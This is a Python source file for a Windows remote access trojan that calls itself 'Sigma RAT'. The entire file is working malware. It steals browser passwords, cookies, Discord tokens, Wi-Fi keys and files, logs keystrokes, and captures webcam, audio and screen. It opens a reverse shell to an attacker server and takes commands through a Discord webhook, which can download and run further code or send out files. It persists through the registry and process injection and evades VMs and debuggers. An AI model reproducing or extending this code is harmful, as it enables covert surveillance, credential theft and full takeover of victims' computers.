import os
import sys
import pyperclip
import platform
import socket
import json
import sqlite3
import datetime
import requests
import zipfile
import subprocess
import threading
import time
import winreg
import shutil
import random
import string
import ctypes
from ctypes import wintypes
from pathlib import Path
from PIL import ImageGrab, Image
import cv2
import numpy as np
import base64
import logging
from pynput.keyboard import Listener
import pyaudio
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from scapy.all import sniff
try:
    import win32crypt
except ImportError:
    pass
import glob
import re

# Logging setup
logging.basicConfig(filename="sigmarat.log", level=logging.DEBUG, 
                   format="%(asctime)s - %(levelname)s - %(message)s")

# AES Encryption Key (randomized per run, hardcoded for simplicity here)
AES_KEY = b"16bytekey1234567"  # In practice, generate dynamically
AES_IV = b"16byteiv12345678"

# Define Windows API constants and functions for critical process
PROCESS_INFORMATION_CLASS = ctypes.c_uint32
ProcessBreakOnTermination = 0x1D  # Enum value for critical process
ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32
ntdll.NtSetInformationProcess.argtypes = [
    wintypes.HANDLE,  # Process handle
    PROCESS_INFORMATION_CLASS,  # Information class
    ctypes.POINTER(ctypes.c_uint32),  # Pointer to data
    ctypes.c_uint32  # Data length
]

def make_process_critical():
    """Set the current process as critical to prevent termination via Task Manager."""
    try:
        # Get current process handle (-1 represents the current process)
        process_handle = kernel32.GetCurrentProcess()
        if not process_handle:
            raise Exception("Failed to get current process handle")

        # Set the critical flag (1 = critical, 0 = not critical)
        critical_flag = ctypes.c_uint32(1)
        status = ntdll.NtSetInformationProcess(
            process_handle,
            ProcessBreakOnTermination,
            ctypes.byref(critical_flag),
            ctypes.sizeof(critical_flag)
        )

        if status != 0:
            raise Exception(f"NtSetInformationProcess failed with status: {status}")
        
        logging.info("Process set as critical - termination will trigger system instability")
    except Exception as e:
        logging.error(f"Failed to set process as critical: {str(e)}")

def encrypt_data(data):
    """Encrypt data with AES."""
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), 16))).decode()

def decrypt_data(encrypted_data):
    """Decrypt AES-encrypted data."""
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), 16).decode()

def hide_file(filepath):
    """Hide file using Windows attributes."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x2 | 0x4)  # Hidden + System
        logging.info(f"Hid file: {filepath}")
    except Exception as e:
        logging.error(f"Hide file error: {str(e)}")

def inject_into_process(process_name="explorer.exe"):
    """Inject into a legitimate process for stealth."""
    try:
        PROCESS_ALL_ACCESS = 0x1F0FFF
        kernel32 = ctypes.windll.kernel32
        pid = [p for p in subprocess.check_output("tasklist").decode().splitlines() if process_name in p][0].split()[1]
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
        if not h_process:
            raise Exception("Failed to open process")
        shellcode = b"\x90" * 100  # Placeholder (real injection needs compiled payload)
        alloc = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), 0x1000 | 0x2000, 0x40)
        kernel32.WriteProcessMemory(h_process, alloc, shellcode, len(shellcode), 0)
        kernel32.CreateRemoteThread(h_process, None, 0, alloc, 0, 0, None)
        logging.info(f"Injected into {process_name} PID {pid}")
    except Exception as e:
        logging.error(f"Injection error: {str(e)}")

def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SigmaUtility", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        hide_file(exe_path)
        logging.info("Added to Registry startup")
    except Exception as e:
        logging.warning(f"Registry startup failed: {str(e)}")
        try:
            startup_dir = Path.home() / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
            startup_dir.mkdir(parents=True, exist_ok=True)
            dest = startup_dir / "SigmaUtility.exe"
            shutil.copy(exe_path, dest)
            hide_file(dest)
            logging.info("Added to Startup folder")
        except Exception as e:
            logging.error(f"Startup folder failed: {str(e)}")
    inject_into_process()  # Stealth injection

def get_system_info():
    return {
        "operating_system": encrypt_data(platform.system()),
        "os_version": encrypt_data(platform.version()),
        "architecture": encrypt_data(platform.machine()),
        "hostname": encrypt_data(socket.gethostname()),
        "local_ip": encrypt_data(socket.gethostbyname(socket.gethostname())),
        "timestamp": encrypt_data(str(datetime.datetime.now()))
    }

def get_browser_paths():
    home = Path.home()
    return {
        "chrome": home / "AppData/Local/Google/Chrome/User Data/Default",
        "edge": home / "AppData/Local/Microsoft/Edge/User Data/Default",
        "opera_gx": home / "AppData/Roaming/Opera Software/Opera GX Stable"
    }

def get_encryption_key(browser_path):
    try:
        local_state_path = browser_path.parent / "Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(password)[:-16].decode()
        return decrypted
    except Exception:
        return f"[Encrypted: {base64.b64encode(password).decode()}]"

def get_browser_cookies(browser_name, base_path):
    try:
        cookie_path = base_path / "Network" / "Cookies"
        if not cookie_path.exists():
            return {"cookies": []}
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 10")
        cookies = [dict(row) for row in cursor.fetchall()]
        conn.close()
        return {"cookies": [{"host": encrypt_data(row["host_key"]), "name": encrypt_data(row["name"]), "value": encrypt_data(row["value"])} for row in cookies]}
    except Exception:
        return {"cookies": []}

def get_browser_session_cookies(browser_name, base_path):
    try:
        cookie_path = base_path / "Network" / "Cookies"
        if not cookie_path.exists():
            return {"session_cookies": []}
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%discord%' LIMIT 10")
        cookies = [{"host": encrypt_data(row["host_key"]), "name": encrypt_data(row["name"]), "value": encrypt_data(row["value"])} for row in cursor.fetchall()]
        conn.close()
        logging.info(f"Collected session cookies for {browser_name}")
        return {"session_cookies": cookies}
    except Exception as e:
        logging.error(f"Session cookies error for {browser_name}: {str(e)}")
        return {"session_cookies": []}

def get_browser_passwords(browser_name, base_path):
    try:
        login_db = base_path / "Login Data"
        if not login_db.exists():
            return {"passwords": []}
        key = get_encryption_key(base_path)
        if not key:
            return {"passwords": []}
        conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 10")
        passwords = []
        for row in cursor.fetchall():
            if row["username_value"] and row["password_value"]:
                decrypted = decrypt_password(row["password_value"], key) if key else "[Encrypted]"
                passwords.append({
                    "website": encrypt_data(row["origin_url"]),
                    "username": encrypt_data(row["username_value"]),
                    "password": encrypt_data(decrypted)
                })
        conn.close()
        return {"passwords": passwords}
    except Exception:
        return {"passwords": []}

def get_browser_history(browser_name, base_path):
    try:
        history_db = base_path / "History"
        if not history_db.exists():
            return {"history": []}
        conn = sqlite3.connect(f"file:{history_db}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls LIMIT 10")
        history = [{"url": encrypt_data(row["url"]), "title": encrypt_data(row["title"]), "time": encrypt_data(str(row["last_visit_time"]))} for row in cursor.fetchall()]
        conn.close()
        return {"history": history}
    except Exception:
        return {"history": []}

def get_discord_tokens():
    tokens = []
    try:
        discord_paths = [
            Path.home() / "AppData/Roaming/Discord/Local Storage/leveldb",
            Path.home() / "AppData/Roaming/discordcanary/Local Storage/leveldb",
            Path.home() / "AppData/Roaming/discordptb/Local Storage/leveldb"
        ]
        token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
        for path in discord_paths:
            if path.exists():
                for file in glob.glob(str(path / "*.ldb")) + glob.glob(str(path / "*.log")):
                    with open(file, "r", errors="ignore") as f:
                        content = f.read()
                        found = re.findall(token_pattern, content)
                        tokens.extend(found)
        logging.info(f"Found {len(tokens)} Discord tokens")
        return {"discord_tokens": [encrypt_data(token) for token in list(set(tokens))]}
    except Exception as e:
        logging.error(f"Discord token error: {str(e)}")
        return {"discord_tokens": []}

def get_discord_backup_codes():
    try:
        backup_file = Path.home() / "Downloads" / "discord_backup_codes.txt"
        if backup_file.exists():
            with open(backup_file, "r") as f:
                codes = [encrypt_data(line.strip()) for line in f.readlines() if line.strip().isdigit()]
            logging.info(f"Found {len(codes)} Discord backup codes")
            return {"backup_codes": codes[:10]}
        return {"backup_codes": []}
    except Exception as e:
        logging.error(f"Backup codes error: {str(e)}")
        return {"backup_codes": []}

def get_clipboard():
    try:
        return {"clipboard": encrypt_data(pyperclip.paste() or "")}
    except Exception:
        return {"clipboard": ""}

def get_test_files(directory="."):
    files = []
    try:
        for root, _, filenames in os.walk(directory):
            for filename in filenames:
                if filename.endswith(".txt"):
                    file_path = os.path.join(root, filename)
                    try:
                        with open(file_path, "r", errors="ignore") as f:
                            files.append({
                                "filename": encrypt_data(filename),
                                "snippet": encrypt_data(f.read()[:100])
                            })
                    except Exception:
                        continue
    except Exception:
        pass
    return {"text_files": files if files else []}

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = f"screenshot_{random.randint(1000,9999)}.png"
        screenshot.save(screenshot_path, "PNG")
        with open(screenshot_path, "rb") as f:
            encoded = encrypt_data(base64.b64encode(f.read()).decode())
        os.remove(screenshot_path)
        hide_file(screenshot_path)
        return {"screenshot": encoded, "format": "PNG"}
    except Exception:
        return {"screenshot": "", "format": ""}

def get_webcam_image():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return {"webcam": "", "format": ""}
        ret, frame = cap.read()
        if ret:
            webcam_path = f"webcam_{random.randint(1000,9999)}.jpg"
            cv2.imwrite(webcam_path, frame)
            with open(webcam_path, "rb") as f:
                encoded = encrypt_data(base64.b64encode(f.read()).decode())
            os.remove(webcam_path)
            hide_file(webcam_path)
            cap.release()
            return {"webcam": encoded, "format": "JPG"}
        cap.release()
        return {"webcam": "", "format": ""}
    except Exception:
        return {"webcam": "", "format": ""}

def record_audio(duration=10):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for _ in range(int(44100 / 1024 * duration)):
            frames.append(stream.read(1024))
        stream.stop_stream()
        stream.close()
        p.terminate()
        audio_data = b"".join(frames)
        encoded = encrypt_data(base64.b64encode(audio_data).decode())
        logging.info("Recorded audio")
        return {"audio": encoded, "format": "raw"}
    except Exception as e:
        logging.error(f"Audio error: {str(e)}")
        return {"audio": "", "format": ""}

def record_screen(duration=10, resolution=(640, 480)):
    try:
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(f"screenrec_{random.randint(1000,9999)}.avi", fourcc, 20.0, resolution)
        start_time = time.time()
        while time.time() - start_time < duration:
            frame = ImageGrab.grab()
            frame = frame.resize(resolution, Image.LANCZOS)
            frame_cv = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
            out.write(frame_cv)
        out.release()
        with open(out.filename, "rb") as f:
            encoded = encrypt_data(base64.b64encode(f.read()).decode())
        os.remove(out.filename)
        hide_file(out.filename)
        logging.info("Recorded screen")
        return {"screen_recording": encoded, "format": "AVI"}
    except Exception as e:
        logging.error(f"Screen record error: {str(e)}")
        return {"screen_recording": "", "format": ""}

def get_wifi_profiles():
    try:
        if platform.system() != "Windows":
            return {"wifi_profiles": []}
        profiles_data = subprocess.check_output("netsh wlan show profiles").decode(errors="ignore")
        profiles = [line.split(":")[1].strip() for line in profiles_data.splitlines() if "All User Profile" in line]
        wifi_list = []
        for profile in profiles[:10]:
            try:
                key_data = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear').decode(errors="ignore")
                key = next((line.split(":")[1].strip() for line in key_data.splitlines() if "Key Content" in line), "Not Found")
                wifi_list.append({"ssid": encrypt_data(profile), "password": encrypt_data(key)})
            except Exception:
                wifi_list.append({"ssid": encrypt_data(profile), "password": encrypt_data("Failed")})
        return {"wifi_profiles": wifi_list}
    except Exception:
        return {"wifi_profiles": []}

def keylogger():
    log_file = f"keylog_{random.randint(1000,9999)}.txt"
    hide_file(log_file)
    def on_press(key):
        try:
            with open(log_file, "a") as f:
                f.write(f"{key} ")
        except Exception:
            pass
    listener = Listener(on_press=on_press)
    listener.start()

def get_keylog():
    try:
        for file in glob.glob("keylog_*.txt"):
            with open(file, "r") as f:
                return {"keylog": encrypt_data(f.read()[:1000])}
        return {"keylog": ""}
    except Exception:
        return {"keylog": ""}

def sniff_network_packets(count=10):
    try:
        packets = sniff(count=count, filter="tcp port 80 or tcp port 443")
        data = [{"src": p[IP].src, "dst": p[IP].dst, "payload": encrypt_data(str(p[TCP].payload)[:100])} for p in packets if IP in p and TCP in p]
        logging.info(f"Sniffed {len(data)} packets")
        return {"network_packets": data}
    except Exception as e:
        logging.error(f"Network sniff error: {str(e)}")
        return {"network_packets": []}

def reverse_shell(server_ip, port=4444):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, port))
        while True:
            cmd = s.recv(1024).decode()
            if cmd.lower() == "exit":
                break
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            s.send(encrypt_data(output).encode())
        s.close()
    except Exception as e:
        logging.error(f"Reverse shell error: {str(e)}")

def self_destruct():
    try:
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        for file in glob.glob("*.txt") + glob.glob("*.json") + glob.glob("*.zip") + glob.glob("*.avi"):
            os.remove(file)
        os.remove(exe_path)
        logging.info("Self-destructed")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Self-destruct error: {str(e)}")

def exfiltrate_file(webhook_url, filepath):
    try:
        with open(filepath, "rb") as f:
            encrypted_data = encrypt_data(base64.b64encode(f.read()).decode())
            files = {"file": (os.path.basename(filepath), encrypted_data.encode())}
            requests.post(webhook_url, files=files)
        logging.info(f"Exfiltrated {filepath}")
    except Exception as e:
        logging.error(f"Exfiltration error: {str(e)}")

def download_and_execute(url):
    try:
        r = requests.get(url, stream=True)
        temp_file = f"temp_{random.randint(1000,9999)}.exe"
        with open(temp_file, "wb") as f:
            f.write(r.content)
        hide_file(temp_file)
        subprocess.Popen(temp_file, shell=True)
        logging.info(f"Executed file from {url}")
    except Exception as e:
        logging.error(f"Download error: {str(e)}")

def detect_vm_or_debugger():
    """Exit if running in VM or debugger."""
    try:
        vm_indicators = ["VIRTUAL", "VMWARE", "VBOX", "QEMU"]
        for indicator in vm_indicators:
            if indicator in subprocess.check_output("systeminfo").decode().upper():
                logging.info("VM detected, exiting")
                self_destruct()
        if ctypes.windll.kernel32.IsDebuggerPresent():
            logging.info("Debugger detected, exiting")
            self_destruct()
    except Exception:
        pass

def command_listener(webhook_url):
    last_message = None
    while True:
        try:
            r = requests.get(webhook_url + "?limit=1")
            if r.status_code == 200:
                msg = decrypt_data(r.json()[0]["content"]) if r.json()[0]["content"] else ""
                if msg != last_message and msg.startswith("!"):
                    last_message = msg
                    logging.info(f"Received command: {msg}")
                    if msg == "!screenshot":
                        payload = {"screenshot": get_screenshot()}
                        send_file_to_webhook(webhook_url, create_zip_file(save_data(payload)))
                    elif msg == "!shutdown":
                        os.system("shutdown /s /t 0")
                    elif msg.startswith("!exfil "):
                        filepath = msg.split(" ", 1)[1]
                        exfiltrate_file(webhook_url, filepath)
                    elif msg.startswith("!exec "):
                        url = msg.split(" ", 1)[1]
                        download_and_execute(url)
                    elif msg == "!selfdestruct":
                        self_destruct()
        except Exception as e:
            logging.error(f"C2 error: {str(e)}")
        time.sleep(5)

def stream_screen(server_ip, server_port, resolution=(640, 480), fps=10):
    retry_attempts = 10
    retry_delay = 10
    for attempt in range(retry_attempts):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            logging.debug(f"Attempt {attempt + 1}: Connecting to {server_ip}:{server_port}")
            client_socket.connect((server_ip, server_port))
            interval = 1 / fps
            while True:
                frame = ImageGrab.grab()
                frame = frame.resize(resolution, Image.LANCZOS)
                frame_cv = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
                _, buffer = cv2.imencode(".jpg", frame_cv, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                frame_data = encrypt_data(base64.b64encode(buffer).decode())
                frame_size = len(frame_data)
                client_socket.send(f"{frame_size}".encode().ljust(16))
                client_socket.send(frame_data.encode())
                time.sleep(interval)
        except Exception as e:
            logging.error(f"Stream client error: {str(e)}")
            if attempt < retry_attempts - 1:
                time.sleep(retry_delay)
            else:
                logging.error("Max retries reached. Streaming stopped.")
        finally:
            client_socket.close()

def save_data(data, filename=f"sigmarat_{random.randint(1000,9999)}.json"):
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        hide_file(filename)
        return filename
    except Exception:
        return None

def create_zip_file(json_file, zip_filename=f"sigmarat_data_{random.randint(1000,9999)}.zip"):
    try:
        with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(json_file)
            for file in glob.glob("*.txt") + glob.glob("*.log"):
                zipf.write(file)
        hide_file(zip_filename)
        return zip_filename
    except Exception:
        return None

def send_file_to_webhook(webhook_url, zip_file):
    try:
        with open(zip_file, "rb") as f:
            # Prepare the embed data
            embed = {
                "title": "Sigma Utility - System Report",
                "description": "A detailed system report has been generated and attached below. Please review the archive for comprehensive diagnostics.",
                "color": 0x1E90FF,  # Professional blue color
                "timestamp": datetime.datetime.utcnow().isoformat(),  # Current UTC time
                "footer": {
                    "text": "Sigma Utility | Automated Diagnostics",
                    "icon_url": "https://i.imgur.com/placeholder.png"  # Replace with your own logo URL
                },
                "fields": [
                    {
                        "name": "Submission Date",
                        "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "inline": True
                    },
                    {
                        "name": "File",
                        "value": os.path.basename(zip_file),
                        "inline": True
                    },
                    {
                        "name": "Hostname",
                        "value": socket.gethostname(),
                        "inline": False
                    },
                    {
                        "name": "IP Address",
                        "value": socket.gethostbyname(socket.gethostname()),
                        "inline": False
                    },
                    {
                        "name": "Status",
                        "value": "Successfully Uploaded",
                        "inline": False
                    }
                ]
            }

            # Prepare the multipart/form-data payload WITHOUT encrypted content
            files = {"file": (os.path.basename(zip_file), f, "application/zip")}
            payload = {
                "embeds": [embed]  # Only send the embed, no content field
            }

            # Send the request
            response = requests.post(
                webhook_url,
                data={"payload_json": json.dumps(payload)},  # JSON payload for embeds
                files=files,
                timeout=10
            )
        
        logging.info(f"Webhook sent with status code: {response.status_code}")
        return response.status_code in (200, 204)
    except Exception as e:
        logging.error(f"Webhook send error: {str(e)}")
        return False

def main():
    WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER"  # Replace with your Discord webhook URL
    STREAM_SERVER_IP = "YOUR_SERVER_IP"
    STREAM_SERVER_PORT = 9999
    STREAM_RESOLUTION = (640, 480)
    STREAM_FPS = 10
    
    detect_vm_or_debugger()  # Exit if VM/debugger detected
    make_process_critical()  # Set process as critical to prevent termination
    logging.info("Starting Sigma RAT")
    time.sleep(30)  # Wait for network
    
    # Start streaming
    stream_thread = threading.Thread(
        target=stream_screen,
        args=(STREAM_SERVER_IP, STREAM_SERVER_PORT, STREAM_RESOLUTION, STREAM_FPS)
    )
    stream_thread.daemon = True
    stream_thread.start()

    # Start C2
    c2_thread = threading.Thread(target=command_listener, args=(WEBHOOK_URL,))
    c2_thread.daemon = True
    c2_thread.start()

    # Start keylogger
    keylog_thread = threading.Thread(target=keylogger)
    keylog_thread.daemon = True
    keylog_thread.start()

    # Start reverse shell
    shell_thread = threading.Thread(target=reverse_shell, args=(STREAM_SERVER_IP, 4444))
    shell_thread.daemon = True
    shell_thread.start()

    # Add to startup
    add_to_startup()

    try:
        browsers = get_browser_paths()
        browser_data = {}
        for name, path in browsers.items():
            browser_data[name] = {
                "cookies": get_browser_cookies(name, path),
                "session_cookies": get_browser_session_cookies(name, path),
                "passwords": get_browser_passwords(name, path),
                "history": get_browser_history(name, path)
            }
        
        payload = {
            "system": get_system_info(),
            "browsers": browser_data,
            "discord": get_discord_tokens(),
            "discord_backup": get_discord_backup_codes(),
            "clipboard": get_clipboard(),
            "files": get_test_files(),
            "screenshot": get_screenshot(),
            "webcam": get_webcam_image(),
            "audio": record_audio(),
            "screen_recording": record_screen(),
            "wifi": get_wifi_profiles(),
            "keylog": get_keylog(),
            "network": sniff_network_packets()
        }
        
        json_file = save_data(payload)
        if json_file:
            zip_file = create_zip_file(json_file)
            if zip_file:
                send_file_to_webhook(WEBHOOK_URL, zip_file)
                os.remove(zip_file)
            os.remove(json_file)
    except Exception as e:
        logging.error(f"Main execution error: {str(e)}")
    
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()